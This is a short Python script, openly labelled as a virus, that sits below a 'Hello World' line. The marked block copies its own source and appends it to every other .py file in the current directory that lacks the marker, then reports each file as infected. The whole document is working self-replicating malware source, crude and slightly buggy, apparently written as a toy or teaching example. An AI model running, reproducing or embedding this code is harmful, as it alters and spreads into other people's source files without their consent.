print("Hello World")
##### VIRUS BEGIN #####
import sys, glob
payload = []

with open(sys.argv[0], 'r') as file:
    for line in file:
        payload.append(line)

files = glob.glob('*.py')

for file in files:
    with open(file, 'r+') as victim:
        infected = False
        if('VIRUS BEGIN' in victim.read()):
            infected = True
            break
            
        if not infected:
            for line in payload:
                victim.write(line)
            print(file + " has been infected")
            
##### VIRUS END #####
